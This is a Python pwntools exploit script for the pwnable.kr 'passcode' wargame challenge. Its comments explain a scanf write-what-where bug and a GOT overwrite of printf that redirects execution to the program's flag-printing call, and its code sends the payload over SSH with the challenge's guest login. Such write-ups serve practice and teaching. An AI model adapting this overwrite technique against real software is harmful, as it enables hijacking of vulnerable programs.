from pwn import *

# passcode
host = 'pwnable.kr'
user = 'passcode'
password = 'guest'
port = 2222

# Notes
#   * The program uses `scanf("%d", passcode1)` instead of
#     `scanf("%d", &passcode1)`.
#   * It will try to write the inputted value to whatever `passcode1`'s
#     initial value is, which is determined by whatever is on the stack at the
#     start of `login`.
#   * Because of the `welcome` function, the stack contains the string that we
#     entered (our "name"), so we can control where `scanf` writes to
#   * We also control what scanf writes, (by definition), so we have a
#     write-what-where vulnerabilty.
#   * The binary has NX and partial RELRO, but not PIE. The server has full ASLR
#   * Since we don't have a memory leak, we can't predict where return addresses
#     are, so we'll have to use a different type of exploit.
#   * A good choice (maybe the only choice) is a GOT overwrite. See link for
#     background reading:
#     https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html
#   * The GOT address for `printf` is 0x0804a000. We'll overwrite it with
#     0x80485e3, which will take us to `system("/bin/cat flag");` in `login`.
#   * I originally targeted `scanf` instead of `printf`, but `scanf`'s GOT
#     entry is at 0x0804a020. This address contains the byte 0x20, which is a
#     space in ASCII, which prevents `scanf` from reading the rest of the bytes.

def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  p = s.process('./passcode')
  print p.recvline()
  p.sendline("A" * (100 - 4) + p32(0x0804a000))
  print p.recvline()
  p.sendline(str(0x80485e3))

  print p.recvall()

if __name__ == '__main__':
  attack()
